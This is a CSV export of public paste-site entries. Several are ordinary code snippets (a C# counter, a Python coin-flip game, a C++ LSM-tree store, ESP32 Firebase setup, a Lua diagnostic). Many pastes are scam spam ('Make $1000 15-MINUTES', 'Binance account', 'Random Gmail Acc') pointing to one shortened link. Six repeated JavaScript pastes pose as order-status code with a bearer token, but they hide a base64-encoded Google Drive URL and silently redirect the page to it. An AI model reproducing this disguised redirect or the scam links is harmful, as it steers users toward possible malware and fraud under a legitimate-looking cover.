id,title,username,language,date,content
Juw4mjT1,Make $1000 15-MINUTES (BEGINNER) F1,danecar21,JavaScript,Wednesday 26th of March 2025 12:45:02 PM CDT," 
Pdf https://tinyurl.com/methodssss


g684nCGMc4
"
2VViz9in,Make $1000 15-MINUTES (BEGINNER) F1,XtuK,JavaScript,Wednesday 26th of March 2025 12:42:36 PM CDT," 
Pdf https://tinyurl.com/methodssss


8G6LyytDZt
"
tfu5QuuU,Binance account BC,XtuK,JavaScript,Wednesday 26th of March 2025 12:40:31 PM CDT," 
Pdf https://tinyurl.com/methodssss


SwCvDbp4y1
"
j95EsM34,EARN $900 INSTANTLY 2025 5D,XtuK,JavaScript,Wednesday 26th of March 2025 12:38:27 PM CDT," 
Pdf https://tinyurl.com/methodssss


kXJUIOOyIE
"
HS98E4vY,Random Gmail Acc 36,XtuK,JavaScript,Wednesday 26th of March 2025 12:36:22 PM CDT," 
Pdf https://tinyurl.com/methodssss


UBwMwr3cn3
"
2n0R4PYz,Make $1000 15-MINUTES (BEGINNER) F1,XtuK,JavaScript,Wednesday 26th of March 2025 12:34:17 PM CDT," 
Pdf https://tinyurl.com/methodssss


zraZ4GFvlu
"
jPxdBVN5,Order.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:33:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/231/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
knzncJy5,Binance account BC,XtuK,JavaScript,Wednesday 26th of March 2025 12:32:13 PM CDT," 
Pdf https://tinyurl.com/methodssss


rCwVKOEJhQ
"
TkMTUHzx,LazyThreadSafeCookieCounter,Catsher,C#,Wednesday 26th of March 2025 12:30:14 PM CDT,"using System.Diagnostics;

namespace ConsoleTestApp;

public class LazyThreadSafeCookieCounter 
{
    private readonly object _cookiesLock = new();
    private int _cookies = 0; 
    public int Cookies { get => _cookies; private set => _cookies = value; }

    private static readonly object _instanceLock = new();
    private static LazyThreadSafeCookieCounter? Instance { get; set; }

    private LazyThreadSafeCookieCounter() { }

    public static LazyThreadSafeCookieCounter GetInstance()
    {
        lock (_instanceLock)
        {
            Instance ??= new LazyThreadSafeCookieCounter();
        }

        return Instance;
    }

    public void IncrementCookie()
    {
        Interlocked.Increment(ref _cookies);
    }

    public void ClearCookies()
    {
        Cookies = 0;
    }
}

public static class Program
{
    public async static Task Main()
    {
        var cookieCounter = LazyThreadSafeCookieCounter.GetInstance();

        IncrementTenMillionTimes(cookieCounter).RunSynchronously();
        cookieCounter.ClearCookies();
        GC.Collect();

        Console.WriteLine(""Cookies amount before: "" + cookieCounter.Cookies);

        var stopwatch = new Stopwatch();
        
        var task = IncrementTenMillionTimes(cookieCounter);

        stopwatch.Start();
        task.RunSynchronously();
        stopwatch.Stop();
        
        Console.WriteLine(""Cookies amount after: "" + cookieCounter.Cookies);
        Console.WriteLine(""Time spent: "" + stopwatch.Elapsed.TotalMilliseconds + "" ms""); 
        Console.WriteLine(""Done."");
    }

    public static Task IncrementTenMillionTimes(LazyThreadSafeCookieCounter cookieCounter)
    {
        void incrementHundredThousandTimes()
        {
            for (var i = 0; i < 100_000; i++)
                cookieCounter.IncrementCookie();
        }

        return new Task(() =>
        {
            Parallel.For(fromInclusive: 0,
                        toExclusive: 100,
                        (int iteration, ParallelLoopState loopState) => incrementHundredThousandTimes());
        });
    }
}
"
yERqvi41,EARN $900 INSTANTLY 2025 5D,XtuK,JavaScript,Wednesday 26th of March 2025 12:30:10 PM CDT," 
Pdf https://tinyurl.com/methodssss


Lzl2GAmw0p
"
6dFWVDfn,Random Gmail Acc 36,XtuK,JavaScript,Wednesday 26th of March 2025 12:28:07 PM CDT," 
Pdf https://tinyurl.com/methodssss


2DFnlbqFad
"
FcFsfTxq,Make $1000 15-MINUTES (BEGINNER) F1,XtuK,JavaScript,Wednesday 26th of March 2025 12:26:00 PM CDT," 
Pdf https://tinyurl.com/methodssss


YiGFWC0JAv
"
9F9PVViP,Binance account BC,XtuK,JavaScript,Wednesday 26th of March 2025 12:23:56 PM CDT," 
Pdf https://tinyurl.com/methodssss


Zp733vuR6t
"
XQUNyfL9,EARN $900 INSTANTLY 2025 5D,XtuK,JavaScript,Wednesday 26th of March 2025 12:21:53 PM CDT," 
Pdf https://tinyurl.com/methodssss


VuqH2xS7h3
"
96qySFKq,Random Gmail Acc 36,XtuK,JavaScript,Wednesday 26th of March 2025 12:19:48 PM CDT," 
Pdf https://tinyurl.com/methodssss


F4y9BpULxx
"
7Ve1Jn9u,Market.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:18:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/054/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DnC2JMrk,or,black_duck11,Python,Wednesday 26th of March 2025 12:15:50 PM CDT,"import random
import time
print('o-orzeł')
print('r-reszka')
print('0-zakończenie gry')
gracz=0
komputer=0
while True:
    wybor=input('Twój wybór to: ')
    if wybor==""0"":break
    elif wybor=='r':wybor='reszka'
    elif wybor=='o':wybor='orzeł'
    else:
        print(""Dokonaj prawidłowego wyboru"")
        print('o-orzeł')
        print('r-reszka')
        print('0-zakończenie gry')
        continue
    rzut=random.choice([""orzeł"",""reszka""])
    time.sleep(3)
    print(f'Wynik rzutu: {rzut}')
    if wybor==rzut:
        gracz+=1
    else:
        komputer+=1
    print(""Wyniki łącznie"")

    print(f'Komputer: {komputer}')
    print(f'Użytkownik: {gracz}')
"
xDrwTZE8,Redka Compact Init ver 3.0,scottish_esquire,C++,Wednesday 26th of March 2025 12:14:06 PM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <filesystem>
#include <chrono>
#include <thread>
#include <algorithm>
#include <cmath>

namespace fs = std::filesystem;

// Конфигурация
const size_t WAL_SIZE_THRESHOLD = 1024; // 1KB
const size_t LEVEL_BASE_SIZE = 10;      // L0: 10 записей, L1: 100, L2: 1000...
const std::string WAL_FILENAME = ""wal.log"";
const std::string DB_DIR = ""lsm_db"";

#pragma pack(push, 1)
struct SSTHeader {
    uint32_t version = 1;
    uint32_t entry_count;
    uint64_t index_offset;
};

struct SSTIndexEntry {
    uint32_t key_length;
    uint64_t data_offset;
    uint32_t data_length;
};
#pragma pack(pop)

struct WalEntry {
    std::string key;
    std::string value;
};

struct SSTEntry {
    std::string key;
    std::string value;

    bool operator<(const SSTEntry& other) const {
        return key < other.key;
    }
};

class LSMTree {
private:
    std::vector<std::vector<std::string>> levels; // Пути к SST-файлам по уровням

    void ensureDbDir() {
        if (!fs::exists(DB_DIR)) {
            fs::create_directory(DB_DIR);
            for (int i = 0; i < 10; ++i) {
                fs::create_directory(DB_DIR + ""/L"" + std::to_string(i));
            }
        }
    }

    void loadLevels() {
        levels.clear();
        for (int i = 0; ; ++i) {
            std::string level_dir = DB_DIR + ""/L"" + std::to_string(i);
            if (!fs::exists(level_dir)) break;

            std::vector<std::string> files;
            for (const auto& entry : fs::directory_iterator(level_dir)) {
                if (entry.path().extension() == "".sst"") {
                    files.push_back(entry.path().string());
                }
            }
            std::sort(files.begin(), files.end());
            levels.push_back(files);
        }
    }

    void compactLevel(int level) {
        if (level >= levels.size()) return;
        
        std::vector<SSTEntry> merged_entries;
        
        // 1. Собираем все записи с текущего уровня
        for (const auto& sst_path : levels[level]) {
            auto entries = readSST(sst_path);
            merged_entries.insert(merged_entries.end(), entries.begin(), entries.end());
        }

        // 2. Если записей достаточно для следующего уровня
        if (merged_entries.size() >= LEVEL_BASE_SIZE * std::pow(10, level)) {
            // Сортируем и удаляем дубликаты
            std::sort(merged_entries.begin(), merged_entries.end());
            auto last = std::unique(merged_entries.begin(), merged_entries.end(),
                [](const auto& a, const auto& b) { return a.key == b.key; });
            merged_entries.erase(last, merged_entries.end());

            // 3. Записываем на следующий уровень
            std::string new_sst = DB_DIR + ""/L"" + std::to_string(level + 1) + ""/"" +
                                 std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
            writeSST(new_sst, merged_entries);

            // 4. Удаляем старые файлы
            for (const auto& sst_path : levels[level]) {
                fs::remove(sst_path);
            }

            // 5. Обновляем индексы
            loadLevels();
            
            // 6. Рекурсивно уплотняем следующий уровень
            compactLevel(level + 1);
        }
    }

    std::vector<SSTEntry> readSST(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        SSTHeader header;
        file.read(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index(header.entry_count);
        file.seekg(header.index_offset);
        file.read(reinterpret_cast<char*>(index.data()), header.entry_count * sizeof(SSTIndexEntry));

        std::vector<SSTEntry> entries;
        for (const auto& idx : index) {
            file.seekg(idx.data_offset);
            uint32_t total_len;
            file.read(reinterpret_cast<char*>(&total_len), sizeof(total_len));

            std::string key(idx.key_length, '\0');
            file.read(&key[0], idx.key_length);

            std::string value(total_len - idx.key_length, '\0');
            file.read(&value[0], value.size());

            entries.push_back({key, value});
        }

        return entries;
    }

    void writeSST(const std::string& path, const std::vector<SSTEntry>& entries) {
        std::ofstream file(path, std::ios::binary);
        SSTHeader header;
        header.entry_count = entries.size();
        file.write(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index;
        for (const auto& entry : entries) {
            SSTIndexEntry idx;
            idx.key_length = entry.key.size();
            idx.data_offset = file.tellp();

            uint32_t total_len = sizeof(uint32_t) + entry.key.size() + entry.value.size();
            file.write(reinterpret_cast<char*>(&total_len), sizeof(total_len));
            file.write(entry.key.data(), entry.key.size());
            file.write(entry.value.data(), entry.value.size());

            idx.data_length = total_len;
            index.push_back(idx);
        }

        header.index_offset = file.tellp();
        for (const auto& idx : index) {
            file.write(reinterpret_cast<const char*>(&idx), sizeof(idx));
        }

        file.seekp(0);
        file.write(reinterpret_cast<char*>(&header), sizeof(header));
    }

    std::vector<WalEntry> readWalFile(const std::string& filename) {
        std::vector<WalEntry> entries;
        std::ifstream wal(filename);
        if (!wal) return entries;
    
        std::string line;
        while (std::getline(wal, line)) {
            // Пропускаем пустые строки
            if (line.empty()) continue;
    
            // Парсим строку вида {@id {data}}
            size_t id_start = line.find('{');
            size_t id_end = line.find(' ', id_start);
            size_t data_start = line.find('{', id_end);
            size_t data_end = line.rfind('}');
    
            if (id_start == std::string::npos || 
                id_end == std::string::npos || 
                data_start == std::string::npos || 
                data_end == std::string::npos) {
                std::cerr << ""Invalid WAL entry: "" << line << std::endl;
                continue;
            }
    
            // Извлекаем ID (формат {@b0b-1})
            std::string id = line.substr(id_start + 2, id_end - id_start - 2);
            
            // Извлекаем данные (всё содержимое между {})
            std::string data = line.substr(data_start, data_end - data_start + 1);
    
            entries.push_back({id, data});
        }
    
        return entries;
    }

public:
    LSMTree() {
        ensureDbDir();
        loadLevels();
    }

    void put(const std::string& key, const std::string& value) {
        // 1. Добавляем в WAL в правильном формате
        std::ofstream wal(WAL_FILENAME, std::ios::app);
        wal << ""{@"" << key << "" "" << value << ""}\n"";  // Формат: {@key value}
        wal.close();
    
        // 2. Проверяем размер WAL
        if (fs::file_size(WAL_FILENAME) >= WAL_SIZE_THRESHOLD) {
            flushWalToL0();
        }
    }

    void flushWalToL0() {
        // 1. Читаем WAL с новым парсером
        auto wal_entries = readWalFile(WAL_FILENAME);
        std::map<std::string, std::string> latest_data;
        
        // Оставляем только последние версии
        for (const auto& e : wal_entries) {
            latest_data[e.key] = e.value;
        }
    
        // 2. Записываем в SST
        std::vector<SSTEntry> entries;
        for (const auto& [key, value] : latest_data) {
            entries.push_back({key, value});
        }
    
        // 3. Создаем новый SST-файл
        std::string sst_path = DB_DIR + ""/L0/"" +
                              std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
        writeSST(sst_path, entries);
    
        // 4. Очищаем WAL
        std::ofstream wal(WAL_FILENAME, std::ios::trunc);
    
        // 5. Обновляем индексы и запускаем компактизацию
        loadLevels();
        compactLevel(0);
    }

    std::string get(const std::string& key) {
        // 1. Проверяем WAL (новые данные)
        auto wal_entries = readWalFile(WAL_FILENAME);
        std::string last_value;
        for (const auto& e : wal_entries) {
            if (e.key == key) last_value = e.value;
        }
        if (!last_value.empty()) return last_value;
    
        // 2. Ищем в SST-файлах (от новых к старым)
        for (const auto& level : levels) {
            for (const auto& sst_path : level) {
                auto entries = readSST(sst_path);
                for (const auto& e : entries) {
                    if (e.key == key) return e.value;
                }
            }
        }
        
        return """"; // Не найдено
    }
};

int main() {
    LSMTree db;
    
    // Теперь данные записываются в правильном формате
    db.put(""b0b-1"", ""{name:\""Alena\"" age:25}"");
    db.put(""b0b-2"", ""{name:\""Ilia\"" age:30}"");
    db.put(""b0b-1"", ""{name:\""Alena\"" age:26}""); // Обновление
    db.put(""b0b-3"", ""{name:\""Stepan\""}"");
    db.put(""b0b-4"", ""{name:\""Dima\""}"");

    for (size_t i = 0; i < 1000; i++) {
        db.put(""b0b-4"", ""{name:\""Dima\""}"");
    }
    
    // Принудительная запись в SST
    db.flushWalToL0();
    
    // Проверка
    std::cout << ""b0b-1: "" << db.get(""b0b-1"") << std::endl;
    std::cout << ""b0b-2: "" << db.get(""b0b-2"") << std::endl;
    std::cout << ""b0b-3: "" << db.get(""b0b-3"") << std::endl;
    std::cout << ""b0b-4: "" << db.get(""b0b-4"") << std::endl;
    
    return 0;
}"
KJauCWtw,Untitled,navrajkhunger,JavaScript,Wednesday 26th of March 2025 12:02:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/191/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fHdFViGU,Products.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:47:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/181/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5bJMRK5d,ESP32 Firebase,ariefhendra,Arduino,Wednesday 26th of March 2025 11:36:31 AM CDT,"#include <Arduino.h>
#if defined(ESP32)
	#include <WiFi.h>
#elif defined(ESP8266)
 	#include <ESP8266WiFi.h>
#endif
#include <Firebase_ESP_Client.h>

// Menyediakan info tentang proses pembuatan token.
#include ""addons/TokenHelper.h""

// Menyediakan info pencetakan muatan dari database dan fungsi bantuan lainnya
#include ""addons/RTDBHelper.h""

// Masukkan info untuk masuk ke jaringan internet
#define WIFI_SSID ""ISIKAN_NAMA_ACCESS_POINT""
#define WIFI_PASSWORD ""ISIKAN_KATA_SANDI_ACCESS_POINT""

// Masukkan Project API Key dari Firebase
#define API_KEY ""ISIKAN_PROJECT_API_KEY_DARI_FIREBASE""

// Masukkan alamat email dan kata sandi untuk mengakses Firebase
#define USER_EMAIL ""ISIKAN_EMAIL_UNTUK_LOGIN""
#define USER_PASSWORD ""ISIKAN_KATA_SANDI_UNTUK_LOGIN""

// Mendeklarasikan objek-objek dari Firebase
FirebaseData fbdo;
FirebaseAuth auth;
FirebaseConfig config;

// Variabel untuk menyimpan USER UID dari Firebase
String uid;

// Fungsi untuk koneksi ke WiFi
void initWiFi() 
{
	WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
 	Serial.print(""Connecting to WiFi .."");
 	while (WiFi.status() != WL_CONNECTED) 
    {
 		Serial.print('.');
 		delay(1000);
 	}
 	Serial.println(WiFi.localIP());
 	Serial.println();
}

void setup()
{
 	Serial.begin(115200); 

	// Inisialisasi WiFi
	initWiFi();

 	// Memasukkan API KEY dari Firebase
 	config.api_key = API_KEY;
 
 	// Memasukkan info login ke Firebase
 	auth.user.email = USER_EMAIL;
 	auth.user.password = USER_PASSWORD;
 	Firebase.reconnectWiFi(true);
 	fbdo.setResponseSize(4096);
 
 	// Menjalankan fungsi pemanggil bila pembuatan token berjalan lama
 	config.token_status_callback = tokenStatusCallback; //mengakses addons/TokenHelper.h
 
 	// Mendeklarasikan jumlah pengulangan maksimal untuk pembuatan token
 	config.max_token_generation_retry = 5;
    
 	// Menjalankan proses otentikasi di Firebase
 	Firebase.begin(&config, &auth);

 	// Mendapatkan USER UID setelah beberapa saat
 	Serial.println(""Getting User UID"");
 	while ((auth.token.uid) == """") 
    {
 		Serial.print('.');
 		delay(1000);
 	}
 
 	// Menampilkan USER UID dari Firebase
 	uid = auth.token.uid.c_str();
 	Serial.print(""User UID: "");
 	Serial.print(uid);
}

void loop()
{
}"
pwPDgrkJ,Order.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:31:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TkMriBuv,Market.js,navrajkhunger,JavaScript,Wednesday 26th of March 2025 11:16:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JCnfaKXq,pericheck,alexnolan,Lua,Wednesday 26th of March 2025 11:03:20 AM CDT,"-- Create a diagnostic program
print(""Detailed peripheral information:"")
for _, name in pairs(peripheral.getNames()) do
    local pType = peripheral.getType(name)
    print(name .. "" is type: "" .. pType)
    
    -- List all methods available on this peripheral
    print(""Available methods:"")
    local methods = {}
    for method, _ in pairs(peripheral.getMethods(name)) do
        table.insert(methods, method)
    end
    textutils.tabulate(methods)
end
"
